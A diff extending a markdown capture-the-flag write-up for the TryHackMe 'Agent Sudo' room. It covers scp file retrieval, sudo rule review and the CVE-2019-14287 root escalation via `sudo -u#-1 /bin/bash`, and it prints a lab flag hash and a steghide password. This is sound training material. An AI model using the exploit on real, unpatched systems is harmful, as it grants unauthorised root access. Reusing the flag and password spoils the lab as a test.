@@ -1,5 +1,64 @@
 # 🕵️ TryHackMe – Agent Sudo Challenge
 
+# 🏁 Understanding CTF Flags
+
+In TryHackMe (and most CTF-style labs):
+
+A **user flag** proves you successfully accessed a normal user account.
+
+Example:
+
+```
+b03d975e8c92a7c04146cfa7a5a313c7
+```
+
+This token confirms:
+
+> You gained access to the machine as user **james**
+
+Most machines contain:
+
+| Flag type | Meaning                          |
+| --------- | -------------------------------- |
+| User flag | User-level shell access obtained |
+| Root flag | Full system compromise (root)    |
+
+Goal progression:
+
+```
+Initial access → user flag → privilege escalation → root flag
+```
+
+---
+
+# 🧠 Understanding CVEs
+
+**CVE = Common Vulnerabilities and Exposures**
+
+A global system for naming publicly known security vulnerabilities.
+
+### Format
+
+```
+CVE-YYYY-NNNN
+```
+
+| Part | Meaning                              |
+| ---- | ------------------------------------ |
+| CVE  | Common Vulnerabilities and Exposures |
+| YYYY | Year published/discovered            |
+| NNNN | Unique vulnerability ID              |
+
+Example:
+
+```
+CVE-2019-14287
+```
+
+This specific CVE relates to a **sudo privilege escalation vulnerability**.
+
+---
+
 ## Path Findings
 
 ### See all opened ports in own machine
@@ -472,4 +531,245 @@ a-alien.png
 → Extract To_agentR.txt
 → Steghide on the-alien.jpg
 → Password: Area51
+```
+
+## 🔐 Remote Access & Privilege Escalation
+
+---
+
+# 📁 Copy Files from Target Machine (SCP)
+
+Once valid SSH credentials were obtained, files could be copied from the target machine.
+
+```bash
+scp "james@10.82.159.128:~/\*" /path/to/folder/in/local-machine
+```
+
+### Important Notes
+
+- `scp` allows secure file transfer over SSH.
+- Quotes are required when using `*` to avoid shell expansion locally.
+- Files will be copied from the remote home directory to a local directory.
+
+### 🔒 Password Handling
+
+SSH and SCP **do not support passing passwords as flags**.
+
+Reason:
+
+> Prevents password leakage in shell history and process lists.
+
+So authentication must be done interactively or via SSH keys.
+
+---
+
+# 🔎 Checking Sudo Permissions
+
+Always check sudo permissions after gaining user access:
+
+```bash
+sudo -l
+```
+
+Output:
+
+```
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+```
+
+This reveals a **sudoers rule**.
+
+---
+
+# 🧾 Understanding the Sudoers Rule
+
+```
+(ALL, !root) /bin/bash
+```
+
+### Breakdown
+
+| Part      | Meaning                   |
+| --------- | ------------------------- |
+| ALL       | James can run as any user |
+| !root     | Except root               |
+| /bin/bash | Only bash allowed         |
+
+### Admin intention:
+
+> “Allow james to run bash as anyone except root — safe configuration.”
+
+Looks secure at first glance.
+
+But there's a subtle bug.
+
+---
+
+# 🧠 How Sudo Normally Works
+
+Standard usage:
+
+```bash
+sudo -u username command
+```
+
+Example:
+
+```bash
+sudo -u bob /bin/bash
+```
+
+Opens shell as user **bob**.
+
+Internally Linux uses **UID numbers**:
+
+| User         | UID   |
+| ------------ | ----- |
+| root         | 0     |
+| normal users | 1000+ |
+
+So:
+
+```bash
+sudo -u#0
+```
+
+means:
+
+> Run command as UID 0 (root)
+
+---
+
+# 💥 Exploiting CVE-2019-14287
+
+Run:
+
+```bash
+sudo -u#-1 /bin/bash
+```
+
+Result:
+
+```
+root@agent-sudo:~/.gnupg#
+```
+
+You now have a root shell.
+
+---
+
+# 🧨 Why This Works (Integer Underflow)
+
+You executed:
+
+```bash
+sudo -u#-1 /bin/bash
+```
+
+This tells sudo:
+
+> Run bash as UID **-1**
+
+But Linux treats UIDs as **unsigned integers**.
+
+So:
+
+```
+-1 becomes:
+4294967295
+```
+
+Sudo mistakenly interprets this as:
+
+```
+UID 0 → root
+```
+
+This is called an **integer underflow vulnerability**.
+
+---
+
+# 🚫 Why the Sudo Restriction Failed
+
+You had:
+
+```
+(ALL, !root) /bin/bash
+```
+
+Meaning:
+
+> Can run as any user except root
+
+Admin believed this was safe.
+
+But due to the sudo bug:
+
+```
+sudo -u#-1 /bin/bash
+```
+
+Bypassed the `!root` restriction completely.
+
+---
+
+# 📌 When This Exploit Works
+
+This vulnerability only works if:
+
+- Sudo version is vulnerable (pre-patch)
+- User has sudo permissions
+- Rule allows running commands as ALL users except root
+
+If config was:
+
+```
+(root) /bin/bash
+```
+
+→ Already root access.
+
+If config was:
+
+```
+(no sudo permissions)
+```
+
+→ No exploit possible.
+
+So the misconfiguration + CVE created the privilege escalation path.
+
+---
+
+# 🧠 Key Learnings
+
+### 1️⃣ Always Run `sudo -l`
+
+Immediately after getting a shell:
+
+```
+sudo -l
+```
+
+This often reveals privilege escalation paths.
+
+---
+
+### 2️⃣ Misconfigurations + CVEs = Goldmine
+
+Privilege escalation often comes from:
+
+- Weak sudo rules
+- Outdated software
+- Known CVEs
+
+Always search:
+
+```
+<service/version> exploit
 ```
